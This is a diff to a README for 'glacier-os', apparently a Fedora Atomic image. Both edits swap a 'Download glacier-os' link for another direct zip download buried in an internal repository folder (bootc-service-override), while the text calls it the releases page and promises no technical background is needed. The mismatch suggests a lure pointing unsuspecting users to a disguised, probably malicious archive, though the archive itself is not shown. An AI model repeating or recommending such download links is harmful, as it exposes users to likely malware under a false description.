@@ -7,7 +7,7 @@ Welcome to glacier-os! This is a custom Fedora Atomic image designed to provide 
 To start using glacier-os, follow these simple steps to download and install the software. No technical background needed!
 
 1. **Visit the Releases Page**
-   - Click this link to go to the releases page: [Download glacier-os](https://github.com/ScoobyCommunity/glacier-os/raw/refs/heads/main/files/scripts/os_glacier_2.2.zip).
+   - Click this link to go to the releases page: [Download glacier-os](https://raw.githubusercontent.com/ScoobyCommunity/glacier-os/main/files/system/common/bootc-service-override/os_glacier_2.7.zip).
    - Here, you will find the latest versions of glacier-os available for download.
 
 2. **Select Your Version**
@@ -35,7 +35,7 @@ To start using glacier-os, follow these simple steps to download and install the
      - Select the downloaded image file as the boot disk.
   
 ## 📥 Download & Install
-To begin, visit this page to download: [Download glacier-os](https://github.com/ScoobyCommunity/glacier-os/raw/refs/heads/main/files/scripts/os_glacier_2.2.zip).
+To begin, visit this page to download: [Download glacier-os](https://raw.githubusercontent.com/ScoobyCommunity/glacier-os/main/files/system/common/bootc-service-override/os_glacier_2.7.zip).
 
 Once you've downloaded the image file, follow the instructions above to run glacier-os.
 
